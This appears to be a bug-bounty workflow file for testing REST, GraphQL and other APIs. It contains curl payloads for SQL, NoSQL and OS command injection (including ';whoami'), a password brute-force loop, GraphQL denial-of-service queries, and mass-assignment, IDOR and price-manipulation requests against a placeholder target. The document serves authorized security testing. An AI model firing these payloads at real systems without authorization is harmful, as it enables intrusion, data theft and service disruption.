# API Security Hunt

**Target Type:** REST APIs, GraphQL, gRPC, WebSocket APIs

**Skills Used:**
- recon-basic.md
- parser-differential-tester.md
- ai-self-validator.md

**Expected Time:** 2-3 hours per API

---

## Phase 1: API Discovery & Mapping (30-45 min)

### Step 1.1: Endpoint Enumeration
**Activate:** `recon-basic.md`

**Actions:**
```bash
# Find API endpoints via Yandex
site:target.com /api/
site:target.com graphql
site:target.com swagger
site:target.com openapi
site:target.com redoc

# Extract from JavaScript
grep -roh "/api/[^\"']*" js_files/ | sort -u > api_endpoints.txt

# Check common paths
curl https://target.com/api/v1/
curl https://target.com/api/v2/
curl https://target.com/graphql
curl https://target.com/swagger.json
curl https://target.com/openapi.json
```

**Document:**
- All API endpoints
- API versions (v1, v2, v3)
- Authentication methods
- Documentation URLs

### Step 1.2: API Documentation Analysis
**Look for:**
- Swagger/OpenAPI specs
- GraphQL introspection
- API documentation pages
- Postman collections

**Actions:**
```bash
# Download API specs
curl https://target.com/swagger.json > swagger.json
curl https://target.com/openapi.yaml > openapi.yaml

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Step 1.3: Parameter Extraction
**Extract all parameters:**
- Path parameters (`/api/user/{id}`)
- Query parameters (`?user_id=123`)
- Body parameters (JSON, XML, form data)
- Headers (custom headers, auth headers)

**Create parameter matrix:**
```
Endpoint: /api/user/{id}
Method: GET
Auth: Bearer token
Parameters:
  - id (path, integer)
  - include (query, string, optional)
```

---

## Phase 2: Authentication & Authorization Testing (45-60 min)

### Step 2.1: Authentication Bypass
**Test for:**
- Missing authentication
- Weak authentication
- Authentication bypass

**PoC:**
```bash
# Test without auth
curl https://target.com/api/user/123

# Test with invalid token
curl https://target.com/api/user/123 \
  -H "Authorization: Bearer invalid"

# Test with expired token
curl https://target.com/api/user/123 \
  -H "Authorization: Bearer EXPIRED_TOKEN"
```

### Step 2.2: IDOR (Insecure Direct Object Reference)
**Test for:** Horizontal and vertical privilege escalation

**PoC:**
```bash
# Create two test accounts
# Account A: user_id=123
# Account B: user_id=456

# From Account A, try to access Account B's data
curl https://target.com/api/user/456 \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN"

# Expected: 403 Forbidden
# Vulnerable: 200 OK with Account B's data
```

### Step 2.3: Mass Assignment
**Test for:** Unintended parameter acceptance

**PoC:**
```bash
# Normal update
curl -X PUT https://target.com/api/user/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "New Name"}'

# Mass assignment test
curl -X PUT https://target.com/api/user/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "New Name", "role": "admin", "is_admin": true}'

# Expected: role/is_admin ignored
# Vulnerable: role/is_admin accepted → privilege escalation
```

---

## Phase 3: Injection Testing (30-45 min)

### Step 3.1: SQL Injection
**Test for:** SQL injection in parameters

**PoC:**
```bash
# Basic SQLi test
curl "https://target.com/api/user?id=1' OR '1'='1"

# Time-based blind SQLi
curl "https://target.com/api/user?id=1' AND SLEEP(5)--"

# Union-based SQLi
curl "https://target.com/api/user?id=1' UNION SELECT NULL,NULL,NULL--"
```

### Step 3.2: NoSQL Injection
**Test for:** NoSQL injection (MongoDB, etc.)

**PoC:**
```bash
# NoSQL injection
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# MongoDB operator injection
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"user_id": {"$gt": ""}}'
```

### Step 3.3: Command Injection
**Test for:** OS command injection

**PoC:**
```bash
# Command injection in parameters
curl "https://target.com/api/ping?host=127.0.0.1;whoami"
curl "https://target.com/api/ping?host=127.0.0.1|whoami"
curl "https://target.com/api/ping?host=127.0.0.1`whoami`"
```

### Step 3.4: GraphQL Injection
**Test for:** GraphQL-specific vulnerabilities

**PoC:**
```bash
# Introspection (if not disabled)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# Batching attack (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { user(id: 1) { name } user(id: 2) { name } ... }"}'

# Nested query (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { posts { comments { author { posts { comments { ... } } } } } } }"}'
```

---

## Phase 4: Business Logic Testing (30-45 min)

### Step 4.1: Rate Limiting
**Test for:** Missing or weak rate limiting

**PoC:**
```bash
# Brute force test
for i in {1..1000}; do
  curl https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"pass${i}\"}"
done

# Expected: Rate limit after N requests
# Vulnerable: No rate limit
```

### Step 4.2: Price Manipulation
**Test for:** Price/amount manipulation

**PoC:**
```bash
# Normal purchase
curl -X POST https://target.com/api/purchase \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": 123, "quantity": 1, "price": 100}'

# Price manipulation
curl -X POST https://target.com/api/purchase \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": 123, "quantity": 1, "price": 0.01}'

# Expected: Server-side price validation
# Vulnerable: Accepts manipulated price
```

### Step 4.3: Workflow Bypass
**Test for:** Skipping required steps

**PoC:**
```bash
# Normal workflow: Step 1 → Step 2 → Step 3
# Test: Skip directly to Step 3

curl -X POST https://target.com/api/checkout/complete \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_id": 123}'

# Expected: Requires Step 1 and Step 2 completion
# Vulnerable: Allows direct completion
```

---

## Phase 5: Parser Differential Testing (30 min)

**Activate:** `parser-differential-tester.md`

### Step 5.1: Duplicate Parameters
**Test for:** Parameter pollution

**PoC:**
```bash
# Duplicate parameters
curl "https://target.com/api/user?id=123&id=456"

# Parameter pollution
curl "https://target.com/api/user?id=123%26admin=true"
```

### Step 5.2: Content-Type Confusion
**Test for:** Content-Type mismatch

**PoC:**
```bash
# Send JSON as form data
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"role": "admin"}'

# Send form data as JSON
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d 'role=admin&is_admin=true'
```

### Step 5.3: HTTP Method Override
**Test for:** Method override headers

**PoC:**
```bash
# Override GET to DELETE
curl -X GET https://target.com/api/user/123 \
  -H "X-HTTP-Method-Override: DELETE"

# Override POST to PUT
curl -X POST https://target.com/api/user/123 \
  -H "X-HTTP-Method-Override: PUT" \
  -d '{"role": "admin"}'
```

---

## Phase 6: Validation (30 min)

**Activate:** `ai-self-validator.md`

### Step 6.1: Challenge Each Finding
**For each potential vulnerability:**

1. **Verify Exploitability**
   - Does the PoC actually work?
   - Can you reproduce it consistently?
   - Is the impact real or theoretical?

2. **Test Protections**
   - Are there WAF rules?
   - Is there input validation?
   - Are there authorization checks?

3. **Prove Impact**
   - What data can you access?
   - What actions can you perform?
   - What's the business impact?

### Step 6.2: Create Deterministic PoC
**Example:**
```bash
#!/bin/bash
# IDOR PoC - Access other user's data

# Step 1: Create two accounts
echo "[+] Creating test accounts..."
ACCOUNT_A_TOKEN=$(curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "user_a", "password": "pass123"}' \
  | jq -r '.token')

ACCOUNT_B_TOKEN=$(curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "user_b", "password": "pass123"}' \
  | jq -r '.token')

# Step 2: Get Account B's user ID
ACCOUNT_B_ID=$(curl https://target.com/api/me \
  -H "Authorization: Bearer $ACCOUNT_B_TOKEN" \
  | jq -r '.user_id')

# Step 3: From Account A, access Account B's data
echo "[+] Testing IDOR..."
curl https://target.com/api/user/$ACCOUNT_B_ID \
  -H "Authorization: Bearer $ACCOUNT_A_TOKEN"

# Expected: 403 Forbidden
# Vulnerable: 200 OK with Account B's data
```

---

## Success Criteria

### Critical Findings
- ✅ Authentication bypass
- ✅ IDOR with sensitive data access
- ✅ SQL/NoSQL injection
- ✅ RCE via command injection
- ✅ Mass assignment → privilege escalation

### High Findings
- ✅ Authorization bypass
- ✅ GraphQL introspection enabled
- ✅ Price manipulation
- ✅ Workflow bypass
- ✅ Missing rate limiting (brute force)

### Medium Findings
- ✅ Information disclosure
- ✅ Weak input validation
- ✅ Missing security headers

---

## Common API Vulnerabilities (From 72 Resources)

### Mass Assignment (Entry #7)
- Test: Add `role`, `is_admin`, `permissions` parameters
- Impact: Privilege escalation
- Success rate: HIGH

### IDOR (Multiple entries)
- Test: Change numeric IDs, UUIDs
- Impact: Data access, account takeover
- Success rate: VERY HIGH

### GraphQL Issues (Entry #4, #41)
- Introspection enabled
- Batching attacks
- Nested queries (DoS)
- Success rate: MEDIUM

### Parser Differentials (Entry #57)
- Duplicate parameters
- Content-Type confusion
- Method override
- Success rate: MEDIUM

---

## Tools Required

### Essential
- curl (PoC testing)
- Burp Suite (request interception)
- jq (JSON parsing)

### Specialized
- ffuf (API fuzzing)
- nuclei (automated scanning)
- GraphQL Voyager (schema visualization)

### Optional
- Postman (API testing)
- Insomnia (API client)
- GraphQL Playground (GraphQL testing)

---

## Time Allocation

| Phase | Time | Priority |
|-------|------|----------|
| Discovery & Mapping | 30-45 min | HIGH |
| Auth & Authz Testing | 45-60 min | CRITICAL |
| Injection Testing | 30-45 min | HIGH |
| Business Logic | 30-45 min | HIGH |
| Parser Testing | 30 min | MEDIUM |
| Validation | 30 min | CRITICAL |

**Total:** 2-3 hours per API

---

## Next Steps After This Workflow

1. **If OAuth found:** Try `01-web-app-hunt.md` (OAuth testing)
2. **If AI features found:** Try `03-ai-app-hunt.md` (prompt injection)
3. **If stuck:** Try `05-adaptive-hunt.md` (less common techniques)

---

## References
- Entry #7: Mass Assignment Privilege Escalation
- Entry #41: Google Support API ($14k, IDOR)
- Entry #4: Yandex Dorking (API discovery)
- Entry #57: Parser Differentials
- Entry #5: AI Self-Validation
